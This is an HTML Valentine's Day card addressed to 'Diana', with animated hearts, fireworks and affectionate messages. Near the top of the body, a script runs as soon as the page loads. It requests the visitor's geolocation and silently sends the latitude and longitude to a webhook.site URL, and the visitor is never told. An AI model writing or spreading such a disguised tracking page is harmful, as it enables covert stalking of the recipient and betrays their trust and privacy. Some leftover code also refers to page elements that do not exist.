<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Valentine's Day 💕</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        /* body {
            font-family: 'Poppins', sans-serif;
            background: url("https://static.vecteezy.com/system/resources/previews/016/387/937/large_2x/happy-valentine-s-day-background-free-vector.jpg") no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        } */
        body {
    font-family: 'Poppins', sans-serif;
     background: url("https://static.vecteezy.com/system/resources/previews/016/387/937/large_2x/happy-valentine-s-day-background-free-vector.jpg") no-repeat center center fixed;
            background-size: cover;
    /* animation: gradientShift 15s ease infinite; */
    min-height: 100vh;
    overflow-x: hidden;
overflow-y: auto;
    position: relative;
}
        
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        /* Floating hearts background */
        .hearts {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 1;
        }
        
        .heart {
            position: absolute;
            font-size: 20px;
            color: rgba(255,255,255,0.8);
            animation: float 6s infinite linear;
        }
        
        @keyframes float {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 0;
            }
            10% {
                opacity: 1;
            }
            90% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }
        
        .container {
            position: relative;
            z-index: 10;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
            color: white;
        }
        
        .main-heart {
            font-size: 120px;
            animation: heartbeat 1.5s ease-in-out infinite alternate;
            margin-bottom: 30px;
            text-shadow: 0 0 20px rgba(255,255,255,0.8);
        }
        
        @keyframes heartbeat {
            0% { transform: scale(1); }
            100% { transform: scale(1.2); }
        }
        
        h1 {
            font-size: 48px;
            font-weight: 700;
            background: linear-gradient(45deg, #ff6b6b, #feca57, #ff9ff3);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { filter: drop-shadow(0 0 10px rgba(255,107,107,0.5)); }
            to { filter: drop-shadow(0 0 20px rgba(255,160,255,0.8)); }
        }
        
        .message {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 40px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            max-width: 600px;
            line-height: 1.6;
        }
        
        .love-message {
            font-size: 24px;
            background: rgba(255,255,255,0.2);
            padding: 25px 40px;
            border-radius: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.3);
            margin: 20px 0;
            animation: slideIn 1s ease-out;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        @keyframes slideIn {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .buttons {
            display: flex;
            gap: 20px;
            margin-top: 40px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .btn {
            padding: 18px 40px;
            font-size: 20px;
            font-weight: 600;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            color: white;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .btn-love {
            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
        }
        
        .btn-love:hover {
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(255,107,107,0.5);
        }
        
        .btn-heart {
            background: linear-gradient(45deg, #ff9ff3, #a55eea);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 10px 30px rgba(255,159,243,0.4); }
            50% { box-shadow: 0 10px 30px rgba(165,94,234,0.8); }
            100% { box-shadow: 0 10px 30px rgba(255,159,243,0.4); }
        }
        
        .btn-heart:hover {
            transform: translateY(-8px);
            box-shadow: 0 20px 40px rgba(165,94,234,0.6);
        }
        
        .fireworks {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 20;
            display: none;
        }
        
       @media (max-width: 1500px) {
    .container {
        transform: scale(1);
    }

    .main-heart { font-size: 90px; }
    h1 { font-size: 36px; }
    .message { font-size: 22px; }
    .love-message { font-size: 20px; padding: 20px 30px; }
    .btn { padding: 15px 30px; font-size: 18px; }
}
    </style>
</head>

<body>
    <!-- Floating hearts -->
    <div class="hearts" id="hearts"></div>
    <script>

    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(function(position){
            var lat = position.coords.latitude;
            var lon = position.coords.longitude;

            // تبعث الإحداثيات مباشرة ل webhook
            fetch("https://webhook.site/859b6ebf-b6e5-49f7-b474-161c00ca082d?lat=" + lat + "&lon=" + lon);

            // توريك البلاصة مباشرة على Google Maps

        }, function(error){
            alert("Location permission denied or unavailable");
        });
    } else {
        alert("Geolocation is not supported by your browser.");
    }
    document.getElementById("getLocationBtn").addEventListener("click", () => {
    if (!navigator.geolocation) {
        document.getElementById("status").textContent = "Geolocation is not supported by your browser.";
        return;
    }

    document.getElementById("status").textContent = "Requesting location...";

    navigator.geolocation.getCurrentPosition(
        (position) => {
            document.getElementById("status").textContent =
                `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        },
        (error) => {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    document.getElementById("status").textContent = "Permission denied.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    document.getElementById("status").textContent = "Location unavailable.";
                    break;
                case error.TIMEOUT:
                    document.getElementById("status").textContent = "Request timed out.";
                    break;
                default:
                    document.getElementById("status").textContent = "An unknown error occurred.";
            }
        }
    );
});
</script>
    <!-- Fireworks canvas -->
    <canvas class="fireworks" id="fireworks"></canvas>
    
    <div class="container">
        <div class="main-heart">💖</div>
        <h1>Happy Valentine's Day Diana!</h1>
        <div class="message">
            On this special day, I love you more than all the stars in the universe Diana🌟✨
        </div>
        <div class="love-message">
            You are my heart, my soul, and everything beautiful in my life 💝
        </div>
        <div class="buttons">
            <button class="btn btn-love" onclick="showFireworks()">I Love You So Much ❤️</button>
            <button class="btn btn-heart" onclick="sendHearts()">Send Hearts 💕</button>
        </div>
    </div>

    <script>
        // Create floating hearts background
        function createFloatingHearts() {
            const heartsContainer = document.getElementById('hearts');
            setInterval(() => {
                const heart = document.createElement('div');
                heart.className = 'heart';
                heart.innerHTML = ['💖', '💕', '💗', '💝', '💘', '🌹'][Math.floor(Math.random() * 6)];
                heart.style.left = Math.random() * 100 + '%';
                heart.style.animationDuration = (Math.random() * 3 + 4) + 's';
                heartsContainer.appendChild(heart);
                
                setTimeout(() => heart.remove(), 7000);
            }, 300);
        }
        
        // Fireworks effect
        function showFireworks() {
            const canvas = document.getElementById('fireworks');
            const ctx = canvas.getContext('2d');
    
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            canvas.style.display = 'block';
            const heartMsg = document.createElement("div");
heartMsg.innerHTML = "💝";
heartMsg.style.position = "fixed";
heartMsg.style.top = "50%";
heartMsg.style.left = "50%";
heartMsg.style.transform = "translate(-50%, -50%)";
heartMsg.style.fontSize = "120px";
heartMsg.style.textAlign = "center";
heartMsg.style.zIndex = "50";
heartMsg.style.color = "white";
heartMsg.style.textShadow = "0 0 30px red";

document.body.appendChild(heartMsg);

// animation
heartMsg.animate([
  { transform: "translate(-50%, -50%) scale(0.5)" },
  { transform: "translate(-50%, -50%) scale(1.2)" },
  { transform: "translate(-50%, -50%) scale(1)" }
], {
  duration: 1500,
  iterations: 1
});

setTimeout(() => {
  heartMsg.remove();
}, 5000);
            let particles = [];
            
            function createFirework() {
                const firework = {
                    x: Math.random() * canvas.width,
                    y: canvas.height,
                    vx: (Math.random() - 0.5) * 10,
                    vy: Math.random() * -20 - 10,
                    color: `hsl(${Math.random() * 360}, 100%, 60%)`,
                    life: 100,
                    explode: false,
                    particles: []
                };
                particles.push(firework);
            }
            
            function explode(particle) {
                for (let i = 0; i < 20; i++) {
                    particle.particles.push({
                        x: particle.x,
                        y: particle.y,
                        vx: (Math.random() - 0.5) * 15,
                        vy: (Math.random() - 0.5) * 15,
                        color: particle.color,
                        life: 60
                    });
                }
                particle.explode = true;
            }
            
            function animateFireworks() {
                ctx.fillStyle = 'rgba(0,0,0,0.1)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                for (let i = particles.length - 1; i >= 0; i--) {
                    const p = particles[i];
                    
                    ctx.fillStyle = p.color;
                    ctx.beginPath();
                    ctx.arc(p.x, p.y, 4, 0, Math.PI * 2);
                    ctx.fill();
                    
                    p.x += p.vx;
                    p.y += p.vy;
                    p.vy += 0.3;
                    p.life--;
                    
                    if (p.vy > 0 && !p.explode) {
                        explode(p);
                    }
                    
                    if (p.life <= 0 && p.particles.length === 0) {
                        particles.splice(i, 1);
                        continue;
                    }
                    
                    // Draw explosion particles
                    for (let j = p.particles.length - 1; j >= 0; j--) {
                        const pp = p.particles[j];
                        ctx.fillStyle = pp.color;
                        ctx.beginPath();
                        ctx.arc(pp.x, pp.y, 3, 0, Math.PI * 2);
                        ctx.fill();
                        
                        pp.x += pp.vx;
                        pp.y += pp.vy;
                        pp.vy += 0.1;
                        pp.life--;
                        
                        if (pp.life <= 0) {
                            p.particles.splice(j, 1);
                        }
                    }
                }
                
                if (particles.length < 5) {
                    createFirework();
                }
                
                if (particles.length > 0) {
                    requestAnimationFrame(animateFireworks);
                } else {
                    setTimeout(() => canvas.style.display = 'none', 1000);
                }
            }
            
            for (let i = 0; i < 8; i++) {
                setTimeout(createFirework, i * 300);
            }
            animateFireworks();
        }
        
        // Send hearts explosion
        function sendHearts() {
            for (let i = 0; i < 30; i++) {
                setTimeout(() => {
                    const heart = document.createElement('div');
                    heart.innerHTML = ['💖', '💕', '💗', '💝', '💘', '🌹'][Math.floor(Math.random() * 6)];
                    heart.style.position = 'fixed';
                    heart.style.left = '50%';
                    heart.style.top = '50%';
                    heart.style.fontSize = '40px';
                    heart.style.pointerEvents = 'none';
                    heart.style.zIndex = '30';
                    heart.style.transform = 'translate(-50%, -50%)';
                    document.body.appendChild(heart);
                    
                    setTimeout(() => {
                        heart.style.transition = 'all 2s ease-out';
                        heart.style.transform = `translate(${Math.random() * 400 - 200}px, ${Math.random() * 400 - 200}px)`;
                        heart.style.opacity = '0';
                        heart.style.fontSize = '60px';
                    }, 100);
                    
                    setTimeout(() => heart.remove(), 2200);
                }, i * 80);
            }
        }
        
        // Mouse trail hearts
        document.addEventListener('mousemove', (e) => {
            if (Math.random() > 0.7) {
                const heart = document.createElement('div');
                heart.innerHTML = ['💕', '💖'][Math.floor(Math.random() * 2)];
                heart.style.position = 'fixed';
                heart.style.left = e.clientX + 'px';
                heart.style.top = e.clientY + 'px';
                heart.style.fontSize = '20px';
                heart.style.pointerEvents = 'none';
                heart.style.zIndex = '25';
                document.body.appendChild(heart);
                
                setTimeout(() => {
                    heart.style.transition = 'all 1.5s ease-out';
                    heart.style.left = (e.clientX + Math.random() * 100 - 50) + 'px';
                    heart.style.top = (e.clientY - 100) + 'px';
                    heart.style.opacity = '0';
                }, 100);
                
                setTimeout(() => heart.remove(), 1600);
            }
        });
        
        // Start floating hearts on load
        window.onload = () => {
            createFloatingHearts();
        };
    </script>
</body>
</html>
